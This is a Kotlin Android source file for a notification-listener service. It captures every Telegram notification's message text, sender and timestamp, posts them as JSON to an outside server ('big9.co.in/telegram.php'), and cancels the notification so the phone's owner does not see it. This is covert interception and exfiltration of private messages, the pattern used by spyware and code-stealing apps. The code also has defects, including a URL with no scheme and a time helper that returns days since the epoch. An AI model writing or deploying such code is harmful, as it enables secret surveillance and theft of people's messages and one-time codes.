package com.epaymark.mynotification

import android.annotation.SuppressLint
import android.app.NotificationManager
import android.content.Context
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONObject
import java.io.IOException

class telegramNotification: NotificationListenerService() {

    private val client = OkHttpClient()

    @SuppressLint("NewApi", "ServiceCast")
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        super.onNotificationPosted(sbn)

        val packageName = sbn.packageName
        val notificationText = sbn.notification.extras.getCharSequence("android.text")?.toString()
        val notificationTitle = sbn.notification.extras.getCharSequence("android.title")?.toString()

        if (packageName == "org.telegram.messenger" && notificationText != null) {


            var timeString = millisecondsToTime(sbn.postTime)
            // Perform the API call on a background thread
            notificationTitle?.let {
                Thread {
                    try {
                        val response = makeApiCall(notificationText, notificationTitle,timeString)
                        if (response != null && response.isSuccessful) {
                            // Handle the API response here
                            val responseBody = response.body?.string()
                            Log.d("NotificationListener", "API Response: $responseBody")
                        } else {
                            // Handle API error
                        }
                    } catch (e: IOException) {
                        e.printStackTrace()
                    }
                }.start()

                // Clear the notification
                val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                val notificationId = sbn.id
                notificationManager.cancel(notificationId)
            }

        }
    }

    private fun makeApiCall(notificationText: String, notificationTitle: String, timeString: String): Response? {
        val jsonMediaType = "application/json; charset=utf-8".toMediaType()
        //val requestBody = "{\"msg\":\"$notificationText\", \"title\":\"$notificationTitle\"}".toRequestBody(jsonMediaType)
        val  requestBody:JSONObject= JSONObject()
        requestBody.put("msg",notificationText)
        requestBody.put("time",timeString)
        requestBody.put("sender",notificationTitle)


        val request = Request.Builder()
            .url("big9.co.in/telegram.php")
            .post(requestBody.toString().toRequestBody(jsonMediaType))
            .build()

        return client.newCall(request).execute()
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d("NotificationListener", "Listener connected")
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        super.onNotificationRemoved(sbn)

        val packageName = sbn.packageName
        val notificationText = sbn.notification.extras.getCharSequence("android.text")?.toString()
        Log.d("NotificationListener", "Notification removed from $packageName: $notificationText")
    }

    fun millisecondsToTime(milliseconds: Long): String
    {
        val seconds = (milliseconds / 1000).toInt()
        val days = seconds / (24 * 3600)
        val hours = (seconds % (24 * 3600)) / 3600
        val minutes = (seconds % 3600) / 60
        val remainingSeconds = seconds % 60
        return String.format("%d days, %d hours, %d minutes, %d seconds", days, hours, minutes, remainingSeconds)
    }
}